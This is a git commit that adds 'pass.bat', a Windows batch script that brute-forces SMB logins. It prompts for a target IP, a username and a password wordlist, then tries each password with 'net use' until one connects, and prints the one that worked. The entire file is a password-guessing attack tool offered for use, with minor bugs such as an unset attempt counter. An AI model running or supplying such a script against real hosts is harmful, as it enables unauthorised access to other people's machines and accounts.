ce7ef680ab8c0c369d39a08d4c7c830872b33daf
xCuub <cuubycuub@gmail.com>
2025-01-12 21:51:19 +0100

    Add files via upload

---
+++ PASSxSPAM/pass.bat
@@ -0,0 +1,25 @@
+@echo off
+color A
+echo.
+set /p ip="enter ip address: "
+set /p user="enter username: "
+set /p wordlist="enter password list: "
+
+for /f %%a in (%wordlist%) do (
+ set pass=%%a
+ call :attempt
+)
+echo password not found!
+pause
+exit
+
+:success
+echo password found!: %pass%
+net use \\%ip% /d /y >nul 2>&1
+pause
+exit
+
+:attempt
+net use \\%ip% /user:%user% %pass% >nul 2>&1
+echo [ATTEMPT %count%] [%pass%]
+if %errorlevel% equ 0 goto success
